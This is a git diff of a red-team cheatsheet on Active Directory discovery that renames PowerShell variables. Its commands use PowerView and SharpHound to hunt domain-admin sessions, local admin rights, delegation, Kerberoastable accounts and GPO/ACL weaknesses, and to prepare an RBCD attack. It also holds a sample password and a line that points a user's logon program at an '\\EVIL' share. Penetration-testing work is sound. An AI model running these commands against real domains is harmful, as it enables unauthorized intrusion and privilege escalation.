@@ -4,7 +4,7 @@ title: TA0007 Discovery - AD Collection & Enumeration
 parent: Pentesting
 category: Pentesting
 grand_parent: Cheatsheets
-modified_date: 2022-07-25
+modified_date: 2022-08-10
 permalink: /:categories/:title/
 ---
 
@@ -67,20 +67,28 @@ gcm -m Recon
 
 #### <a name='Settingvariablesforcopypaste'></a>Setting variables for copy/paste
 ```powershell
-$forest = "corp"
-$dom = "contoso"
-$dom_dc = "DC01"
-$dom_fqdn = $dom + "." + $forest
-$dom_fqdn_dc = $dom_dc + "." + $dom_fqdn
-$dom_dc_san = $dom_dc + "$"
-$dom_dn = "DC=contoso,DC=corp"
-$dom_dc_ip = ""
+$zforest = "corp"
 
-$dom_da_grp = "Domain Admins"
+$zdom = "contoso"
+$zdom_fqdn = $zdom + "." + $zforest
+$zdom_dn = "DC=contoso,DC=corp"
 
-$target_user = "admin"
-$target_computer = "PC001"
-$target_OU = "Admins"
+$zdom_dc = "DC01"
+$zdom_dc_fqdn = $zdom_dc + "." + $zdom_fqdn
+$zdom_dc_san = $zdom_dc + "$"
+$zdom_dc_ip = ""
+
+$ztarg_computer = "PC001"
+$ztarg_computer_fqdn = $ztarg_computer + "." + $zdom_fqdn
+$ztarg_computer_san = $ztarg_computer + "$"
+$ztarg_computer_ip = ""
+
+$ztarg_user = "admin"
+$ztarg_OU = "Admins"
+```
+To verify the variables use the command:
+```powershell
+Get-Variable | Out-String
 ```
 
 #### <a name='Handlingconsoleerrors'></a>Handling console errors
@@ -119,7 +127,7 @@ Refresh sessions:
 ```powershell
 # STEP 1 : go to bloodhound GUI / database statistics / clear session data
 # STEP 2 : collect sessions again
- ./sharphound.exe -c computeronly --domain $dom_fqdn --domaincontroller $dom_fqdn_dc
+ ./sharphound.exe -c computeronly --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
 ```
 
 ## <a name='DataEnumeration'></a>Data Enumeration
@@ -128,38 +136,38 @@ Refresh sessions:
 
 ```powershell
 # check the domain object (fsmo, DCs, ntds replication, dns servers, machineaccountquota)
-Get-DomainObject -identity $dom_dn -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Get-DomainObject -identity $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # list the domain controllers
-nltest /dclist:$dom_fqdn
-Get-NetDomainController -Domain $dom_fqdn
+nltest /dclist:$zdom_fqdn
+Get-NetDomainController -Domain $zdom_fqdn
 
 # enumerate the current domain controller policy
-$DCPolicy = Get-DomainPolicy -Policy $dom_fqdn_dc -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+$DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 $DCPolicy.PrivilegeRights # user privilege rights on the dc...
 
 # enumerate the current domain policy
-$dom_fqdnainPolicy = Get-DomainPolicy -Policy $dom_fqdn -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-$dom_fqdnainPolicy.KerberosPolicy
-$dom_fqdnainPolicy.SystemAccess # password age/etc.
+$zdom_fqdnainPolicy = Get-DomainPolicy -Policy $zdom_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+$zdom_fqdnainPolicy.KerberosPolicy
+$zdom_fqdnainPolicy.SystemAccess # password age/etc.
 
 # who can dcsync
-get-netuser -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select -first 1 #get the domain's distinguisedname attribute
-$dom_dn = "DC=" + $dom + ",DC=" + $forest # only valid if 2 levels
+get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select -first 1 #get the domain's distinguisedname attribute
+$zdom_dn = "DC=" + $zdom + ",DC=" + $zforest # only valid if 2 levels
 # TO DEBUG : get-forest error ...
-get-domainobjectacl $dom_dn -Domain $dom_fqdn -DomainController $dom_fqdn_dc -ResolveGUIDs | ? {
+get-domainobjectacl $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -ResolveGUIDs | ? {
 	($_.ObjectType -match 'replication-get') -or
 	($_.ActiveDirectoryRights -match 'GenericAll')
 } 
 
 # audit the permissions of AdminSDHolder, resolving GUIDs
 # TO DEBUG : get-forest error ...
-$search_base = "CN=AdminSDHolder,CN=System," + $dom_dn
-Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+$search_base = "CN=AdminSDHolder,CN=System," + $zdom_dn
+Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # protected users / works with Win Server 2012 R2 and above
-Get-NetGroupMember "Protected Users" -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select membername
-Get-NetGroupMember "Protected Users" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | select membername
+Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select membername
+Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
 ```
 
 ### <a name='Forestproperties'></a>Forest properties
@@ -167,14 +175,14 @@ Get-NetGroupMember "Protected Users" -Domain $dom_fqdn -DomainController $dom_fq
 ```powershell
 # get the trusts of the current domain/forest
 nltest /domain_trusts
-Get-NetDomainTrust -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-NetForestTrust -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-NetDomainTrust -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-NetForestTrust -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # get information about an other forest
-Get-NetForest -Forest $forest -DomainController $dom_fqdn_dc
+Get-NetForest -Forest $zforest -DomainController $zdom_dc_fqdn
 
 # find users with sidHistory set
-Get-DomainUser -LDAPFilter '(sidHistory=*)' -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Get-DomainUser -LDAPFilter '(sidHistory=*)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 ```
 
@@ -185,19 +193,20 @@ References:
 
 #### <a name='DomainAdminAccount'></a>Domain Admin Account
 ```powershell
-# get all the effective members of DA groups / reporting logon activity
-Get-NetGroupMember -Identity "Domain Admins" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | %{Get-NetUser $_.membername -domain $dom_fqdn -domaincontroller $dom_fqdn_dc | select samAccountName,LogonCount,LastLogon,mail}
-Get-NetGroupMember -Identity "Enterprise Admins" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | %{Get-NetUser $_.membername -domain $dom_fqdn -domaincontroller $dom_fqdn_dc | select samAccountName,LogonCount,LastLogon,mail}
+# get the DA sorted by last logon
+Get-NetGroupMember "Domain Admins" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | %{Get-NetUser $_.membername -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | select samAccountName,LogonCount,LastLogon,mail} | Sort-Object -Descending -Property lastlogon
+# get the EA sorted by last logon
+Get-NetGroupMember "Enterprise Admins" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | %{Get-NetUser $_.membername -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | select samAccountName,LogonCount,LastLogon,mail} | Sort-Object -Descending -Property lastlogon
 
-# Find admin groups based on "adm" keyword
-Get-NetGroup -Domain $dom_fqdn -DomainController $dom_fqdn_dc *adm* 
+# find admin groups based on "adm" keyword
+Get-NetGroup -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn *adm* 
 
 # PowerView: find where DA has logged on / and current user has access
 # can be long and noisy, does net share discovery over \\machine\IPC$
-Invoke-UserHunter -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Invoke-UserHunter -CheckAccess -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Invoke-UserHunter -CheckAccess -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select username, computername, IPAddress
- ./sharphound.exe -c computeronly --domain $dom_fqdn --domaincontroller $dom_fqdn_dc
+Invoke-UserHunter -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Invoke-UserHunter -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Invoke-UserHunter -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
+ ./sharphound.exe -c computeronly --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
 ```
 
 #### <a name='OtherPrivilegedUsers'></a>Other Privileged Users
@@ -207,47 +216,47 @@ Invoke-UserHunter -CheckAccess -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
 ```powershell
 # look for a user from his objectsid
 $objectsid = 'S-1-5-21-123'
-get-netuser -domain $dom_fqdn -domaincontroller $dom_fqdn_dc | ?{$_.objectsid -eq $objectsid} | select -first 1
+get-netuser -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | ?{$_.objectsid -eq $objectsid} | select -first 1
 
 # look for the keyword "pass" in the description attribute for each user in the domain
-Find-UserField -SearchField Description -SearchTerm "pass" -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Find-UserField -SearchField Description -SearchTerm "pass" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # find where the backup operators are logged on
-Invoke-UserHunter -Group "Backup Operators" -Domain $dom_fqdn -DomainControler $dom_fqdn_dc | select computername, membername
-Get-NetGroupMember "Backup Operators" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | select membername
-Get-NetGroupMember "Remote Desktop Users" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | select membername
-Get-NetGroupMember "DNSAdmins" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | select membername
+Invoke-UserHunter -Group "Backup Operators" -Domain $zdom_fqdn -DomainControler $zdom_dc_fqdn | select computername, membername
+Get-NetGroupMember "Backup Operators" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
+Get-NetGroupMember "Remote Desktop Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
+Get-NetGroupMember "DNSAdmins" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
 
 # find computers where the current user is local admin
-Find-LocalAdminAccess -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Find-LocalAdminAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # find local admins on all computers of the domain
-Invoke-EnumerateLocalAdmin -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select computername, membername
+Invoke-EnumerateLocalAdmin -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select computername, membername
 
 # return the local group *members* of a remote server using Win32 API methods (faster but less info)
-Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN> -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN> -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 ```
 
 #### <a name='TargetingaComputer'></a>Targeting a Computer
 ```powershell
 # get actively logged users on a computer
-Get-NetLoggedon -ComputerName $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
 
-# get last logged users on a computer
-Get-LastLoggedon -ComputerName $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+# get last logged users on a computer / uses remote registry / can be blocked
+Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds
 
 # find any machine accounts in privileged groups
-Get-DomainGroup -AdminCount -Domain $dom_fqdn -DomainController $dom_fqdn_dc | Get-NetGroupMember -Recurse -Domain $dom_fqdn -DomainController $dom_fqdn_dc | ?{$_.MemberName -like '*$'}
+Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Get-NetGroupMember -Recurse -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.MemberName -like '*$'}
 
 # testing account "john_doe" with empty passwords 
 $mycreds = New-Object System.Management.Automation.PSCredential("john_doe", (new-object System.Security.SecureString))
 Invoke-Command -Credential $mycreds -ComputerName $computer -ScriptBlock {whoami; hostname}
 
 # Get the logged on users for all machines in any *server* OU in a particular domain
-Get-DomainOU -Identity $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc | %{Get-DomainComputer -Domain $dom_fqdn -DomainController $dom_fqdn_dc -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $dom_fqdn -DomainController $dom_fqdn_dc}}
+Get-DomainOU -Identity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-DomainComputer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}}
 
 # return the local *groups* of a remote server
-Get-NetLocalGroup $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Get-NetLocalGroup $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 ```
 ### <a name='T1134.001TokenImpersonationviaDelegations'></a>T1134.001 Token Impersonation via Delegations
 
@@ -256,15 +265,15 @@ References :
 
 ```powershell
 # enumerate all computers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
-Get-DomainComputer -Unconstrained -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-DomainUser -AllowDelegation -AdminCount -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-DomainComputer -Unconstrained -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-DomainUser -AllowDelegation -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # Find-DomainUserLocation == old Invoke-UserHunter
 # enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
-Find-DomainUserLocation -ComputerUnconstrained -ShowAll -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Find-DomainUserLocation -ComputerUnconstrained -ShowAll -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # hunt for admin accounts that allow delegation, logged into servers that allow unconstrained delegation
-Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
 
 ### <a name='T1615GroupPolicyDiscovery'></a>T1615 Group Policy Discovery
@@ -273,35 +282,35 @@ Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegat
 
 ```powershell
 # local admin rights
-Find-GPOComputerAdmin -ComputerName $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-NetOU $OU -Domain $dom_fqdn -DomainController $dom_fqdn_dc | %{Get-NetComputer -ADSPath $_ -Domain $dom_fqdn -DomainController $dom_fqdn_dc}
+Find-GPOComputerAdmin -ComputerName $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-NetOU $OU -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-NetComputer -ADSPath $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}
 
 # reset password
-Get-NetGPO -Domain $dom_fqdn -DomainController $dom_fqdn_dc | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword" -Domain $dom_fqdn -DomainController $dom_fqdn_dc }
+Get-NetGPO -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }
 
 # RDP access
-Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $user -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $group -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # list users and GPO he can modifiy
-Get-NetGPO -Domain $dom_fqdn -DomainController $dom_fqdn_dc | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -Domain $dom_fqdn -DomainController $dom_fqdn_dc }
+Get-NetGPO -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }
 
 # retrieve all the computer dns host names a GPP password applies to
-Get-DomainOU -GPLink '<GPP_GUID>' -Domain $dom_fqdn -DomainController $dom_fqdn_dc | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname -Domain $dom_fqdn -DomainController $dom_fqdn_dc}
+Get-DomainOU -GPLink '<GPP_GUID>' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}
 
 # enumerate what machines that a particular user/group identity has local admin rights to
 #   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
-Get-DomainGPOUserLocalGroupMapping -Identity $user -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-DomainGPOUserLocalGroupMapping -Identity $group -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-DomainGPOUserLocalGroupMapping -Identity $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-DomainGPOUserLocalGroupMapping -Identity $group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # export a csv of all GPO mappings
-Get-DomainGPOUserLocalGroupMapping -Domain $dom_fqdn -DomainController $dom_fqdn_dc | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
+Get-DomainGPOUserLocalGroupMapping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
 
 # find all policies applied to a computer/server
-Get-DomainGPO -ComputerIdentity $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Get-DomainGPO -ComputerIdentity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # find all policies applied to an user
-Find-GPOLocation -UserName $user -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Find-GPOLocation -UserName $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 ```
 ### <a name='T1135NetworkShares'></a>T1135 Network Shares
 
@@ -310,11 +319,11 @@ References:
 
 ```powershell
 # find share folders in the domain
-Invoke-ShareFinder -Domain $dom_fqdn -DomainController $dom_fqdn_dc
+Invoke-ShareFinder -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # use alternate credentials for searching for files on the domain
 #   Find-InterestingDomainShareFile == old Invoke-FileFinder
-Find-InterestingDomainShareFile -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Credential $Credential
+Find-InterestingDomainShareFile -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Credential $zlat_creds
 ```
 
 ### <a name='TxxxMSSQLservers'></a>Txxx MSSQL servers
@@ -328,7 +337,7 @@ References:
 # sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
 # get-content mssql_servers_shorted.txt | get-netcomputer -Identity $_ -properties cn,description,OperatingSystem,OperatingSystemVersion,isCriticalSystemObject
 
- Get-SQLInstanceDomain -Verbose -DomainController $dom_fqdn_dc -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
+ Get-SQLInstanceDomain -Verbose -DomainController $zdom_dc_fqdn -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
 ```
 
 ### <a name='TXXXXACL'></a>TXXXX ACL
@@ -340,25 +349,25 @@ References:
 
 ```powershell
 # Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
-Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $dom_fqdn -DomainController $dom_fqdn_dc  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
 
-# enumerate who has rights to the $user in $dom_fqdn, resolving rights GUIDs to names
-Get-DomainObjectAcl -Identity $user -ResolveGUIDs -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+# enumerate who has rights to the $user in $zdom_fqdn, resolving rights GUIDs to names
+Get-DomainObjectAcl -Identity $user -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # gather info on security groups
-Get-ObjectAcl -SamAccountName "Domain Computers" -ResolveGUIDs -Verbose -Domain $dom_fqdn -DomainController $dom_fqdn_dc | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
-Invoke-ACLScanner -ResolveGUIDs -Domain $dom_fqdn -DomainController $dom_fqdn_dc | ?{$_.IdentityReference -match "RDPUsers"} 
+Get-ObjectAcl -SamAccountName "Domain Computers" -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match "RDPUsers"} 
 ```
 - Prepare RBCD attack :
 ```powershell
 # requirement : DC > win 2012
-Get-DomainController -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select name.osversion | fl
+Get-DomainController -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name.osversion | fl
 # requirement : target user is not a member of the "Protected Users" group
-Get-NetGroupMember "Protected Users" -Domain $dom_fqdn -DomainController $dom_fqdn_dc -Recurse | select membername
+Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
 # requirement : MachineAccountQuota / possibility to create a new computer
-Get-DomainObject -identity $dom_dn -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select ms-ds-machineaccountquota
+Get-DomainObject -identity $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select ms-ds-machineaccountquota
 # requirement  : check constraint delegation setting on the target computer 
-Get-NetComputer $computer -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select name,msds-allowedtoactonbehalfofotheridentity | fl
+Get-NetComputer $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name,msds-allowedtoactonbehalfofotheridentity | fl
 # check targetuser is not part of protected users 
 
 # Target Computer Name : $computer
@@ -375,55 +384,44 @@ References:
 
 ```powershell
 # find all users with an SPN set (likely service accounts)
-Get-DomainUser -SPN -Domain $dom_fqdn -DomainController $dom_fqdn_dc | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof
+Get-NetUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof
+
+# wsman
+# mssqlsvc
 sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
 
 # find all service accounts in "Domain Admins"
-Get-DomainUser -SPN -Domain $dom_fqdn -DomainController $dom_fqdn_dc | ?{$_.memberof -match 'Domain Admins'}
+Get-DomainUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.memberof -match 'Domain Admins'}
 
 # find all Win2008 R2 computers (likely servers) and IP/ICMP reachable
-Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
 
 ### <a name='MISC'></a>MISC
 ```powershell
-# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
-Get-DomainGroup -MemberIdentity $user -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-DomainGroup -MemberIdentity $group -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-
-# all enabled users, returning distinguishednames
-Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-
 # all disabled users
-Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-
-# use multiple identity types for any *-Domain* function
-'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dagreat,CN=Users,DC=<Domain>,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # find all computers in a given OU
-Get-DomainComputer -SearchBase "ldap://OU=..." -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-DomainComputer -SearchBase "ldap://OU=..." -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # enumerate all gobal catalogs in the forest
-Get-ForestGlobalCatalog -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Get-ForestGlobalCatalog -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # turn a list of computer short names to FQDNs, using a global catalog
-gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname -Domain $dom_fqdn -DomainController $dom_fqdn_dc }
+gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }
 
 # save a PowerView object to disk for later usage
-Get-DomainUser -Domain $dom_fqdn -DomainController $dom_fqdn_dc | Export-Clixml user.xml
-$Users = Import-Clixml user.xml
+Get-DomainUser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Export-Clixml user.xml
+$ztarg_users = Import-Clixml user.xml
 
 # enumerate all groups in a domain that don't have a global scope, returning just group names
-Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
-
-# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
-Get-DomainComputer -FindOne -Domain $dom_fqdn -DomainController $dom_fqdn_dc | Find-DomainObjectPropertyOutlier
+Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # set the specified property for the given user identity
-Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
-# Set the owner of 'dfm' in the current domain to $user
-Set-DomainObjectOwner -Identity dfm -OwnerIdentity $user -Domain $dom_fqdn -DomainController $dom_fqdn_dc 
+# Set the owner of 'dfm' in the current domain to $ztarg_user
+Set-DomainObjectOwner -Identity dfm -OwnerIdentity $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
